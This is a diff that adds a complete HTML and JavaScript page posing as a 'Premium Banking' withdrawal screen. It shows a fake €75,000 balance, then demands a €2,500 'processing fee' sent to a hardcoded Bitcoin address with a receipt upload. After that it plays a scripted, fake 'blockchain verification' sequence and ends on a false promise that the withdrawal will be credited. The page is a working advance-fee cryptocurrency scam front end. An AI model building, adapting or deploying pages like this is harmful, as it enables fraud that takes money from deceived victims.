@@ -1,0 +1,746 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
+    />
+    <title>Premium Banking - Withdraw</title>
+    <!-- Premium Font: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <!-- Include Phosphor Icons & GSAP -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ["Inter", "sans-serif"],
+            },
+            colors: {
+              appBg: "#0b0e11",
+              surface: "#1e2329",
+              surfaceHover: "#2b3139",
+              brand: "#0047FF",
+              textMain: "#F5F5F5",
+              textMuted: "#848E9C",
+              danger: "#F6465D",
+              warning: "#F5B700",
+              success: "#23C55E",
+            },
+          },
+        },
+      };
+    </script>
+    <style>
+      * {
+        -webkit-tap-highlight-color: transparent;
+        box-sizing: border-box;
+      }
+      body {
+        background-color: #0b0e11;
+      }
+      .no-scrollbar::-webkit-scrollbar {
+        display: none;
+      }
+      .no-scrollbar {
+        -ms-overflow-style: none;
+        scrollbar-width: none;
+      }
+      .gpu-accel {
+        will-change: transform, opacity;
+      }
+
+      /* Input styles */
+      input:focus {
+        outline: none;
+      }
+
+      /* Glowing Effects */
+      .glow-brand {
+        box-shadow: 0 0 20px rgba(0, 71, 255, 0.4);
+      }
+
+      /* Custom Loader */
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-left-color: #0047ff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Animated Gradient Background */
+      @keyframes gradient-shift {
+        0% {
+          background-position: 0% 50%;
+        }
+        50% {
+          background-position: 100% 50%;
+        }
+        100% {
+          background-position: 0% 50%;
+        }
+      }
+      .bg-animated {
+        background: linear-gradient(-45deg, #0b0e11, #001f66, #0b0e11);
+        background-size: 200% 200%;
+        animation: gradient-shift 8s ease infinite;
+      }
+
+      /* Hide elements initially for GSAP */
+      #fee-screen,
+      #loading-screen,
+      #success-screen,
+      #toast {
+        display: none;
+      }
+    </style>
+  </head>
+  <body
+    class="text-textMain font-sans m-0 p-0 antialiased flex justify-center items-center min-h-screen"
+  >
+    <!-- App Container -->
+    <div
+      class="max-w-[450px] mx-auto w-full h-[100dvh] bg-appBg relative flex flex-col overflow-hidden shadow-2xl border-x border-gray-900/50"
+    >
+      <!-- ========================================== -->
+      <!-- SCREEN 1: MAIN WITHDRAWAL FORM             -->
+      <!-- ========================================== -->
+      <div
+        id="main-screen"
+        class="flex-1 flex flex-col h-full overflow-y-auto no-scrollbar relative z-10"
+      >
+        <!-- Header -->
+        <div
+          class="bg-animated pt-2 pb-6 rounded-b-[32px] shadow-[0_12px_40px_-10px_rgba(0,71,255,0.15)] relative z-20 shrink-0"
+        >
+          <header
+            class="flex justify-between items-center px-6 mb-4 relative"
+            style="padding-top: max(1rem, env(safe-area-inset-top))"
+          >
+            <button
+              class="w-11 h-11 rounded-[18px] bg-[#1e2329]/90 border border-white/10 flex items-center justify-center text-white active:scale-90 transition-all duration-200 backdrop-blur-xl"
+            >
+              <i class="ph ph-caret-left text-[22px]"></i>
+            </button>
+            <h1 class="text-[17px] font-bold tracking-wide drop-shadow-sm">
+              Withdraw Funds
+            </h1>
+            <div class="w-11 h-11"></div>
+            <!-- Spacer -->
+          </header>
+
+          <div class="text-center px-6 mt-4">
+            <p class="text-[13px] text-white/70 font-medium mb-1">
+              Available Balance
+            </p>
+            <h2
+              class="text-[36px] font-extrabold text-white tracking-tight leading-none"
+            >
+              €75,000.00
+            </h2>
+          </div>
+        </div>
+
+        <!-- Form Area (Reduced bottom padding to flow naturally) -->
+        <div class="px-5 pt-8 pb-4 flex flex-col gap-6">
+          <!-- Asset Selection (Locked to BTC) -->
+          <div class="flex flex-col gap-2">
+            <label class="text-[13px] font-semibold text-textMuted ml-1"
+              >Withdrawal Method</label
+            >
+            <div
+              class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center justify-between opacity-80 cursor-not-allowed"
+            >
+              <div class="flex items-center gap-3">
+                <div
+                  class="w-10 h-10 rounded-full bg-[#F7931A]/20 flex items-center justify-center"
+                >
+                  <i
+                    class="ph-fill ph-currency-btc text-[#F7931A] text-[22px]"
+                  ></i>
+                </div>
+                <div>
+                  <h3 class="text-[15px] font-bold text-white leading-tight">
+                    Bitcoin (BTC)
+                  </h3>
+                  <p class="text-[12px] text-textMuted mt-0.5">
+                    Network: Bitcoin
+                  </p>
+                </div>
+              </div>
+              <i class="ph-fill ph-lock-key text-textMuted text-[18px]"></i>
+            </div>
+            <p
+              class="text-[11px] text-brand font-medium ml-1 flex items-center gap-1 mt-1"
+            >
+              <i class="ph-fill ph-info"></i> For security reasons, only BTC
+              withdrawals are currently supported.
+            </p>
+          </div>
+
+          <!-- Amount Input -->
+          <div class="flex flex-col gap-2">
+            <div class="flex justify-between items-end ml-1">
+              <label class="text-[13px] font-semibold text-textMuted"
+                >Amount (EUR)</label
+              >
+              <button
+                class="text-[12px] font-bold text-brand bg-brand/10 px-2 py-0.5 rounded-md active:scale-95 transition"
+              >
+                MAX
+              </button>
+            </div>
+            <div
+              class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center gap-3 focus-within:border-brand transition-colors duration-300"
+            >
+              <span class="text-[20px] font-bold text-white/50">€</span>
+              <input
+                type="number"
+                id="withdraw-amount"
+                value="75000"
+                class="bg-transparent w-full text-[20px] font-bold text-white placeholder-white/20"
+                placeholder="0.00"
+              />
+            </div>
+            <p class="text-[12px] text-textMuted ml-1 text-right">
+              ≈ 1.1852 BTC
+            </p>
+          </div>
+
+          <!-- Wallet Address -->
+          <div class="flex flex-col gap-2">
+            <label class="text-[13px] font-semibold text-textMuted ml-1"
+              >Destination BTC Address</label
+            >
+            <div
+              class="w-full bg-surface border border-white/10 rounded-[20px] p-4 flex items-center gap-3 focus-within:border-brand transition-colors duration-300"
+            >
+              <input
+                type="text"
+                id="btc-address"
+                class="bg-transparent w-full text-[14px] font-medium text-white placeholder-white/20"
+                placeholder="Enter long BTC address..."
+              />
+              <button class="text-brand active:scale-90 transition-transform">
+                <i class="ph ph-scan text-[22px]"></i>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Sticky Bottom Button (Fixed overlap issue) -->
+        <div
+          class="sticky bottom-0 left-0 w-full px-5 pt-12 pb-8 bg-gradient-to-t from-[#0b0e11] via-[#0b0e11] via-60% to-transparent z-20 mt-auto pointer-events-none"
+        >
+          <button
+            id="btn-init-withdraw"
+            class="pointer-events-auto w-full bg-brand hover:bg-brand/90 text-white font-bold text-[16px] py-4 rounded-[20px] shadow-[0_8px_20px_-6px_rgba(0,71,255,0.6)] active:scale-[0.98] transition-all duration-200"
+          >
+            Continue Withdrawal
+          </button>
+        </div>
+      </div>
+
+      <!-- ========================================== -->
+      <!-- SCREEN 2: FEE PAYMENT & PROOF UPLOAD       -->
+      <!-- ========================================== -->
+      <div
+        id="fee-screen"
+        class="absolute inset-0 bg-appBg z-30 flex flex-col h-full overflow-y-auto no-scrollbar"
+      >
+        <header
+          class="flex justify-between items-center px-6 py-4 relative shrink-0"
+          style="padding-top: max(1rem, env(safe-area-inset-top))"
+        >
+          <button
+            id="btn-back-fee"
+            class="w-11 h-11 rounded-[18px] bg-surface border border-white/10 flex items-center justify-center text-white active:scale-90 transition-all duration-200"
+          >
+            <i class="ph ph-x text-[22px]"></i>
+          </button>
+          <h1 class="text-[16px] font-bold tracking-wide">Action Required</h1>
+          <div class="w-11 h-11"></div>
+        </header>
+
+        <div class="px-5 pt-2 pb-4 flex flex-col gap-5">
+          <!-- Alert Box -->
+          <div
+            class="bg-warning/10 border border-warning/20 rounded-[20px] p-5 flex gap-4"
+          >
+            <i
+              class="ph-fill ph-warning-circle text-warning text-[28px] shrink-0 mt-0.5"
+            ></i>
+            <div>
+              <h3 class="text-[15px] font-bold text-white mb-1">
+                Processing Fee Required
+              </h3>
+              <p class="text-[13px] text-white/70 leading-relaxed">
+                To process your large withdrawal of
+                <span class="text-white font-bold">€75,000.00</span>, network
+                liquidity rules require a standard processing fee of
+                <span class="text-white font-bold">€2,500</span> to be settled
+                externally.
+              </p>
+            </div>
+          </div>
+
+          <!-- Payment Details -->
+          <div
+            class="bg-surface border border-white/5 rounded-[24px] p-5 shadow-lg"
+          >
+            <h4 class="text-[14px] font-semibold text-textMuted mb-4">
+              Transfer Details
+            </h4>
+
+            <div
+              class="flex justify-between items-center mb-5 border-b border-white/5 pb-4"
+            >
+              <span class="text-[14px] text-textMuted">Amount Needed</span>
+              <div class="text-right">
+                <p class="text-[18px] font-bold text-white">~0.0395 BTC</p>
+                <p class="text-[12px] text-textMuted">
+                  €2,500.00 EUR equivalent
+                </p>
+              </div>
+            </div>
+
+            <div class="flex flex-col gap-2">
+              <span class="text-[13px] text-textMuted"
+                >Send exactly to this BTC Address:</span
+              >
+              <div
+                class="w-full bg-[#14181d] border border-white/10 rounded-[16px] p-3 flex items-center justify-between gap-3 relative overflow-hidden group"
+              >
+                <p
+                  id="fee-address"
+                  class="text-[13px] font-medium text-white/90 truncate font-mono"
+                >
+                  bc1qvhaa0mwk6e3804scw7cu7m8ac26dr42nq9rplz
+                </p>
+                <button
+                  id="btn-copy"
+                  class="shrink-0 bg-white/10 hover:bg-white/20 w-8 h-8 rounded-lg flex items-center justify-center transition-colors active:scale-90 pointer-events-auto"
+                >
+                  <i class="ph ph-copy text-[16px] text-white"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- File Upload for Proof -->
+          <div class="flex flex-col gap-2 mt-2">
+            <h4 class="text-[14px] font-semibold text-textMuted ml-1">
+              Upload Proof of Payment
+            </h4>
+
+            <label
+              id="upload-area"
+              class="w-full border-2 border-dashed border-white/20 bg-surface/50 rounded-[24px] p-6 flex flex-col items-center justify-center gap-3 cursor-pointer hover:border-brand/50 hover:bg-surface transition-all duration-300 relative overflow-hidden"
+            >
+              <input
+                type="file"
+                id="file-upload"
+                class="hidden"
+                accept="image/*,.pdf"
+              />
+              <div
+                id="upload-icon-container"
+                class="w-14 h-14 rounded-full bg-brand/10 text-brand flex items-center justify-center transition-colors"
+              >
+                <i
+                  id="upload-icon"
+                  class="ph ph-cloud-arrow-up text-[28px]"
+                ></i>
+              </div>
+              <div class="text-center">
+                <p
+                  id="upload-title"
+                  class="text-[15px] font-bold text-white mb-1"
+                >
+                  Tap to upload receipt
+                </p>
+                <p id="upload-subtitle" class="text-[12px] text-textMuted">
+                  JPG, PNG, or PDF format
+                </p>
+              </div>
+            </label>
+            <p
+              id="upload-error"
+              class="text-[12px] text-danger font-medium ml-1 hidden mt-1"
+            >
+              <i class="ph-fill ph-warning-circle"></i> Proof of payment is
+              required to proceed.
+            </p>
+          </div>
+        </div>
+
+        <!-- Sticky Verify Button (Fixed overlap issue) -->
+        <div
+          class="sticky bottom-0 left-0 w-full px-5 pt-12 pb-8 bg-gradient-to-t from-[#0b0e11] via-[#0b0e11] via-60% to-transparent mt-auto z-20 pointer-events-none"
+        >
+          <button
+            id="btn-verify"
+            class="pointer-events-auto w-full bg-white text-black font-bold text-[16px] py-4 rounded-[20px] shadow-[0_8px_20px_-6px_rgba(255,255,255,0.4)] active:scale-[0.98] transition-all duration-200"
+          >
+            Submit Verification
+          </button>
+        </div>
+      </div>
+
+      <!-- ========================================== -->
+      <!-- SCREEN 3: LOADING SEQUENCE                 -->
+      <!-- ========================================== -->
+      <div
+        id="loading-screen"
+        class="absolute inset-0 bg-appBg/95 backdrop-blur-xl z-40 flex flex-col items-center justify-center h-full px-8 text-center"
+      >
+        <div class="spinner mb-8"></div>
+        <h2 class="text-[20px] font-bold text-white mb-2">Verifying Payment</h2>
+        <p class="text-[14px] text-textMuted leading-relaxed">
+          Please wait while we scan the blockchain and verify your proof of
+          payment document...
+        </p>
+
+        <!-- Progress steps -->
+        <div class="w-full mt-10 flex flex-col gap-4 text-left">
+          <div class="flex items-center gap-3 text-white/50" id="step-1">
+            <i
+              class="ph-fill ph-check-circle text-[20px] text-success hidden"
+              id="step-1-check"
+            ></i>
+            <i
+              class="ph-bold ph-circle-dashed text-[20px] animate-spin"
+              id="step-1-spin"
+            ></i>
+            <span class="text-[14px] font-medium">Encrypting document...</span>
+          </div>
+          <div class="flex items-center gap-3 text-white/20" id="step-2">
+            <i
+              class="ph-fill ph-check-circle text-[20px] text-success hidden"
+              id="step-2-check"
+            ></i>
+            <i
+              class="ph-bold ph-circle-dashed text-[20px] animate-spin hidden"
+              id="step-2-spin"
+            ></i>
+            <i class="ph-bold ph-circle text-[20px]" id="step-2-idle"></i>
+            <span class="text-[14px] font-medium"
+              >Validating hash on network...</span
+            >
+          </div>
+          <div class="flex items-center gap-3 text-white/20" id="step-3">
+            <i
+              class="ph-fill ph-check-circle text-[20px] text-success hidden"
+              id="step-3-check"
+            ></i>
+            <i
+              class="ph-bold ph-circle-dashed text-[20px] animate-spin hidden"
+              id="step-3-spin"
+            ></i>
+            <i class="ph-bold ph-circle text-[20px]" id="step-3-idle"></i>
+            <span class="text-[14px] font-medium">Queuing withdrawal...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- ========================================== -->
+      <!-- SCREEN 4: SUCCESS                          -->
+      <!-- ========================================== -->
+      <div
+        id="success-screen"
+        class="absolute inset-0 bg-appBg z-50 flex flex-col items-center justify-center h-full px-6 text-center"
+      >
+        <div
+          class="w-24 h-24 rounded-full bg-success/10 flex items-center justify-center mb-6 scale-0"
+          id="success-icon-bg"
+        >
+          <i class="ph-fill ph-check-circle text-success text-[64px]"></i>
+        </div>
+        <h1
+          class="text-[24px] font-extrabold text-white mb-3 opacity-0 translate-y-4"
+          id="success-title"
+        >
+          Verification Submitted
+        </h1>
+        <p
+          class="text-[15px] text-textMuted leading-relaxed opacity-0 translate-y-4 mb-10"
+          id="success-desc"
+        >
+          Your processing fee receipt has been received. Your withdrawal of
+          <strong>€75,000.00</strong> will be credited to your BTC wallet
+          shortly.
+        </p>
+
+        <div class="w-full opacity-0 translate-y-4" id="success-btn">
+          <button
+            class="w-full bg-[#1e2329] border border-white/10 text-white font-bold text-[16px] py-4 rounded-[20px] active:scale-[0.98] transition-all duration-200"
+            onclick="location.reload()"
+          >
+            Return to Dashboard
+          </button>
+        </div>
+      </div>
+
+      <!-- Custom Toast Notification -->
+      <div
+        id="toast"
+        class="absolute top-10 left-1/2 -translate-x-1/2 bg-[#1e2329] border border-white/10 shadow-2xl rounded-full px-5 py-3 flex items-center gap-2 z-50"
+      >
+        <i class="ph-fill ph-check-circle text-success text-[18px]"></i>
+        <span class="text-[13px] font-semibold text-white"
+          >Address copied to clipboard!</span
+        >
+      </div>
+    </div>
+
+    <!-- Application Logic -->
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // --- Elements ---
+        const mainScreen = document.getElementById("main-screen");
+        const feeScreen = document.getElementById("fee-screen");
+        const loadingScreen = document.getElementById("loading-screen");
+        const successScreen = document.getElementById("success-screen");
+
+        const btnInitWithdraw = document.getElementById("btn-init-withdraw");
+        const btcAddressInput = document.getElementById("btc-address");
+        const btnBackFee = document.getElementById("btn-back-fee");
+        const btnVerify = document.getElementById("btn-verify");
+        const btnCopy = document.getElementById("btn-copy");
+
+        const fileUpload = document.getElementById("file-upload");
+        const uploadArea = document.getElementById("upload-area");
+        const uploadIconContainer = document.getElementById(
+          "upload-icon-container",
+        );
+        const uploadIcon = document.getElementById("upload-icon");
+        const uploadTitle = document.getElementById("upload-title");
+        const uploadSubtitle = document.getElementById("upload-subtitle");
+        const uploadError = document.getElementById("upload-error");
+
+        let isFileUploaded = false;
+
+        // --- 1. Transition: Main -> Fee Screen ---
+        btnInitWithdraw.addEventListener("click", () => {
+          // Check if wallet address is empty (just a visual check for realism)
+          if (btcAddressInput.value.trim() === "") {
+            gsap.to(btcAddressInput.parentElement, {
+              x: [-5, 5, -5, 5, 0],
+              borderColor: "#F6465D",
+              duration: 0.4,
+            });
+            return;
+          }
+
+          feeScreen.style.display = "flex";
+          gsap.fromTo(
+            feeScreen,
+            { y: "100%", opacity: 1 },
+            { y: "0%", duration: 0.5, ease: "power3.out" },
+          );
+        });
+
+        // --- 2. Transition: Fee Screen -> Main (Back) ---
+        btnBackFee.addEventListener("click", () => {
+          gsap.to(feeScreen, {
+            y: "100%",
+            duration: 0.4,
+            ease: "power3.in",
+            onComplete: () => {
+              feeScreen.style.display = "none";
+            },
+          });
+        });
+
+        // --- 3. Copy Clipboard Logic ---
+        btnCopy.addEventListener("click", () => {
+          const address = document.getElementById("fee-address").innerText;
+          navigator.clipboard.writeText(address).then(() => {
+            // Button visual feedback
+            const originalIcon = btnCopy.innerHTML;
+            btnCopy.innerHTML =
+              '<i class="ph-fill ph-check text-[16px] text-success"></i>';
+            btnCopy.classList.add("bg-success/20");
+
+            // Show toast
+            const toast = document.getElementById("toast");
+            toast.style.display = "flex";
+            gsap.fromTo(
+              toast,
+              { y: -20, opacity: 0, scale: 0.9 },
+              {
+                y: 0,
+                opacity: 1,
+                scale: 1,
+                duration: 0.3,
+                ease: "back.out(1.5)",
+              },
+            );
+
+            setTimeout(() => {
+              gsap.to(toast, {
+                y: -20,
+                opacity: 0,
+                scale: 0.9,
+                duration: 0.3,
+                ease: "power2.in",
+                onComplete: () => (toast.style.display = "none"),
+              });
+              btnCopy.innerHTML = originalIcon;
+              btnCopy.classList.remove("bg-success/20");
+            }, 2500);
+          });
+        });
+
+        // --- 4. File Upload Logic ---
+        fileUpload.addEventListener("change", (e) => {
+          if (e.target.files && e.target.files.length > 0) {
+            const fileName = e.target.files[0].name;
+            isFileUploaded = true;
+            uploadError.classList.add("hidden");
+
+            // Visual changes for success upload
+            uploadArea.classList.replace("border-white/20", "border-success");
+            uploadArea.classList.replace("bg-surface/50", "bg-success/5");
+
+            uploadIconContainer.classList.replace(
+              "bg-brand/10",
+              "bg-success/20",
+            );
+            uploadIconContainer.classList.replace("text-brand", "text-success");
+            uploadIcon.className = "ph-fill ph-file-check text-[28px]";
+
+            uploadTitle.innerText = "Document Attached";
+            uploadTitle.classList.replace("text-white", "text-success");
+
+            uploadSubtitle.innerText = fileName;
+
+            // Pop animation
+            gsap.fromTo(
+              uploadArea,
+              { scale: 0.98 },
+              { scale: 1, duration: 0.3, ease: "back.out(2)" },
+            );
+          }
+        });
+
+        // --- 5. Submit & Loading Sequence ---
+        btnVerify.addEventListener("click", () => {
+          if (!isFileUploaded) {
+            // Error state
+            uploadError.classList.remove("hidden");
+            gsap.to(uploadArea, {
+              x: [-8, 8, -5, 5, 0],
+              borderColor: "#F6465D",
+              duration: 0.4,
+            });
+            return;
+          }
+
+          // Start Loading
+          loadingScreen.style.display = "flex";
+          gsap.fromTo(
+            loadingScreen,
+            { opacity: 0 },
+            { opacity: 1, duration: 0.3 },
+          );
+
+          // Mocking the complex verification steps with timelines
+          setTimeout(() => {
+            // Step 1 done, start Step 2
+            document.getElementById("step-1-spin").classList.add("hidden");
+            document.getElementById("step-1-check").classList.remove("hidden");
+            document
+              .getElementById("step-1")
+              .classList.replace("text-white/50", "text-white/90");
+
+            document
+              .getElementById("step-2")
+              .classList.replace("text-white/20", "text-white/50");
+            document.getElementById("step-2-idle").classList.add("hidden");
+            document.getElementById("step-2-spin").classList.remove("hidden");
+          }, 1500);
+
+          setTimeout(() => {
+            // Step 2 done, start Step 3
+            document.getElementById("step-2-spin").classList.add("hidden");
+            document.getElementById("step-2-check").classList.remove("hidden");
+            document
+              .getElementById("step-2")
+              .classList.replace("text-white/50", "text-white/90");
+
+            document
+              .getElementById("step-3")
+              .classList.replace("text-white/20", "text-white/50");
+            document.getElementById("step-3-idle").classList.add("hidden");
+            document.getElementById("step-3-spin").classList.remove("hidden");
+          }, 3500);
+
+          setTimeout(() => {
+            // Step 3 done, trigger success screen
+            document.getElementById("step-3-spin").classList.add("hidden");
+            document.getElementById("step-3-check").classList.remove("hidden");
+            document
+              .getElementById("step-3")
+              .classList.replace("text-white/50", "text-white/90");
+
+            showSuccessScreen();
+          }, 5000);
+        });
+
+        // --- 6. Success Screen Animation ---
+        function showSuccessScreen() {
+          successScreen.style.display = "flex";
+          gsap.to(loadingScreen, {
+            opacity: 0,
+            duration: 0.4,
+            onComplete: () => (loadingScreen.style.display = "none"),
+          });
+
+          const tl = gsap.timeline();
+          tl.to("#success-icon-bg", {
+            scale: 1,
+            duration: 0.6,
+            ease: "elastic.out(1, 0.5)",
+            delay: 0.2,
+          })
+            .to(
+              "#success-title",
+              { opacity: 1, y: 0, duration: 0.4, ease: "power2.out" },
+              "-=0.3",
+            )
+            .to(
+              "#success-desc",
+              { opacity: 1, y: 0, duration: 0.4, ease: "power2.out" },
+              "-=0.2",
+            )
+            .to(
+              "#success-btn",
+              { opacity: 1, y: 0, duration: 0.4, ease: "power2.out" },
+              "-=0.1",
+            );
+        }
+      });
+    </script>
+  </body>
+</html>
